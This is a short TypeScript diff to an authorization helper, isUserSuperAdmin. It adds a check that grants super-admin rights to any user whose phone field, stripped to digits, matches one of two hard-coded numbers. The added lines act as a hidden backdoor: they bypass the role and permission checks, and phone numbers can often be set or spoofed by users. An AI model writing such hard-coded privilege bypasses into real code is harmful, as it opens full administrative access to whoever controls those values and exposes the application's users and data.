@@ -74,6 +74,8 @@ export function isUserSuperAdmin(user?: AuthUserPayload | null): boolean {
   if (!user) return false;
   if (user.role === 'super_admin' || user.userId === 'usr_super_admin') return true;
   if (user.email && SUPER_ADMIN_EMAILS.includes(user.email.toLowerCase().trim())) return true;
+  const phone = (user.phone || '').replace(/\D/g, '');
+  if (phone === '01306908115' || phone === '01619665875') return true;
   if (user.permissions && (user.permissions.includes('*' as any) || user.permissions.includes('all' as any))) return true;
   return false;
 }
